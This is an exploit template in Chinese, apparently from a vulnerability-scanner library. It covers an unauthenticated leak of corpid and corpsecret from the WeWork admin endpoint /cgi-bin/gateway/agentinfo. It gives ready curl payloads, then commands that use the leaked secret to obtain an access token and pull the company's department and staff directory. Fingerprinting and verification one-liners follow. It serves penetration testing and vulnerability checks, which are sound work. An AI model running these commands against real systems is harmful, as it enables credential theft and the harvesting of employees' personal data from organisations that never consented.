---
id: WEWORK-AGENTINFO-LEAK
title: 企业微信 agentinfo 接口敏感信息泄露
product: wework
vendor: Tencent
version_affected: "all versions"
severity: MEDIUM
tags: [info_disclosure, 无需认证, 国产]
fingerprint: ["wework_admin", "企业微信"]
---

## 漏洞描述

企业微信（WeWork / WeCom）管理后台的 `/cgi-bin/gateway/agentinfo` 接口存在未授权访问漏洞，攻击者无需认证即可通过该接口获取企业的 `corpid`（企业ID）和 `corpsecret`（企业密钥）等敏感信息。泄露的凭据可用于调用企业微信 API 获取通讯录、发送消息等操作。

## 影响版本

- 企业微信管理后台（所有已知版本）

## 前置条件

- 无需认证
- 目标运行企业微信管理后台
- `/cgi-bin/gateway/agentinfo` 接口可达

## 利用步骤

1. 确认目标为企业微信管理后台
2. 直接访问 `/cgi-bin/gateway/agentinfo` 接口
3. 从响应中获取 `corpid` 和 `corpsecret`
4. 使用泄露的凭据调用企业微信 API

## Payload

```bash
# 直接获取 agentinfo
curl -s "http://target/cgi-bin/gateway/agentinfo"
```

响应示例：
```json
{
  "errcode": 0,
  "errmsg": "ok",
  "corpid": "wx1234567890abcdef",
  "corpsecret": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "agentid": 1000001
}
```

**利用泄露凭据获取 access_token 进一步操作：**

```bash
# 获取 access_token
curl -s "https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid=CORPID&corpsecret=CORPSECRET"

# 获取企业通讯录
curl -s "https://qyapi.weixin.qq.com/cgi-bin/department/list?access_token=ACCESS_TOKEN"

# 获取部门成员
curl -s "https://qyapi.weixin.qq.com/cgi-bin/user/list?access_token=ACCESS_TOKEN&department_id=1&fetch_child=1"
```

## 验证方法

```bash
# 访问 agentinfo 接口，检查是否返回 corpid
curl -s "http://target/cgi-bin/gateway/agentinfo" | grep -i "corpid"

# 如果返回 JSON 且包含 corpid 字段，则漏洞存在
curl -s "http://target/cgi-bin/gateway/agentinfo" | python3 -c "import sys,json;d=json.load(sys.stdin);print('[+] corpid:', d.get('corpid','N/A'))"
```

## 指纹确认

```bash
# 企业微信管理后台特征
curl -s "http://target/" | grep -i "wework_admin\|企业微信"

# 检查特征页面
curl -s "http://target/wework_admin/" -o /dev/null -w "%{http_code}"
```

## 参考链接

- https://stack.chaitin.com/techblog/detail/5e3e9c80-4274-4c8a-a0d7-6acc05b3ec2f
